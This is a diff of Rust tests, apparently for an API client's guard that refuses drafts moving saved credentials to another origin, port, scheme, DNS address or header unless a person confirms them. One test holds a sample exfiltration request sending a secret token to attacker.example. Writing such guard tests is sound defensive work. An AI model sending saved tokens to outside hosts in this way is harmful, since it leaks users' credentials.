@@ -267,12 +267,12 @@ mod tests {
     #[tokio::test]
     async fn a_draft_moving_saved_credentials_to_another_origin_is_refused_unless_confirmed_natively() {
         let f = fixture();
-        let (rid, saved) = f.saved("https://api.payments.example/v1/charges", bearer(&f.secret));
+        let (rid, saved) = f.saved("https://shop.example/v1/charges", bearer(&f.secret));
         let moved = [
             "https://attacker.example/v1/charges",
             // Cleartext, or another port, is another origin.
-            "http://api.payments.example/v1/charges",
-            "https://api.payments.example:8443/v1/charges",
+            "http://shop.example/v1/charges",
+            "https://shop.example:8443/v1/charges",
         ];
         for url in moved {
             let draft = RequestSpec { url: url.into(), ..saved.clone() };
@@ -285,11 +285,11 @@ mod tests {
     #[tokio::test]
     async fn a_draft_that_sends_saved_credentials_where_the_saved_request_does_is_not_asked() {
         let f = fixture();
-        let (rid, saved) = f.saved("https://api.payments.example/v1/charges", bearer(&f.secret));
+        let (rid, saved) = f.saved("https://shop.example/v1/charges", bearer(&f.secret));
         let unasked = Answer::no();
         // As saved, and with another path, query, method and headers.
         assert_eq!(f.authorized(&unasked, Some(rid), saved.clone()).await, Ok(()));
-        let mut edited = RequestSpec { url: "https://API.payments.example:443/v2/refunds?limit=5".into(), ..saved.clone() };
+        let mut edited = RequestSpec { url: "https://SHOP.example:443/v2/refunds?limit=5".into(), ..saved.clone() };
         edited.method = "POST".into();
         assert_eq!(f.authorized(&unasked, Some(rid), edited).await, Ok(()));
         assert_eq!(unasked.times(), 0);
@@ -301,7 +301,7 @@ mod tests {
         let mut w = f.app.workspace(&f.ws).unwrap();
         w.auth = bearer(&f.secret);
         f.app.save_workspace(w).unwrap();
-        let (rid, saved) = f.saved("https://api.payments.example/v1", AuthConfig::Inherit);
+        let (rid, saved) = f.saved("https://shop.example/v1", AuthConfig::Inherit);
         let unasked = Answer::no();
         assert_eq!(f.authorized(&unasked, Some(rid), saved.clone()).await, Ok(()));
         assert_eq!(unasked.times(), 0);
@@ -317,7 +317,7 @@ mod tests {
         let value = SensitiveValue::Secret { secret: f.secret.clone() };
         w.variables.push(Variable { name: "token".into(), value, secret: true, enabled: true, description: String::new() });
         f.app.save_workspace(w).unwrap();
-        let (rid, _) = f.saved("https://api.payments.example/v1", AuthConfig::None);
+        let (rid, _) = f.saved("https://shop.example/v1", AuthConfig::None);
         let mut draft = RequestSpec::http("GET", "https://attacker.example/?t={{token}}");
         draft.auth = AuthConfig::None;
         let no = Answer::no();
@@ -328,10 +328,10 @@ mod tests {
     #[tokio::test]
     async fn a_draft_changing_how_saved_credentials_are_carried_is_refused_unless_confirmed_natively() {
         let f = fixture();
-        let (rid, saved) = f.saved("https://api.payments.example/v1", bearer(&f.secret));
+        let (rid, saved) = f.saved("https://shop.example/v1", bearer(&f.secret));
         // The same URL, resolved to another address.
         let mut dns = saved.clone();
-        dns.settings.dns_overrides.push(DnsOverride { host: "api.payments.example".into(), addresses: vec!["127.0.0.1".into()] });
+        dns.settings.dns_overrides.push(DnsOverride { host: "shop.example".into(), addresses: vec!["127.0.0.1".into()] });
         // The same URL and token, in another header.
         let mut header = saved.clone();
         let value = SensitiveValue::Secret { secret: f.secret.clone() };
@@ -350,7 +350,7 @@ mod tests {
         let mut local = RequestSpec::http("GET", "http://127.0.0.1:8080/health");
         local.auth = AuthConfig::None;
         assert_eq!(f.authorized(&unasked, None, local.clone()).await, Ok(()));
-        let (rid, _) = f.saved("https://api.payments.example/v1", AuthConfig::None);
+        let (rid, _) = f.saved("https://shop.example/v1", AuthConfig::None);
         assert_eq!(f.authorized(&unasked, Some(rid), local).await, Ok(()));
         assert_eq!(unasked.times(), 0);
     }
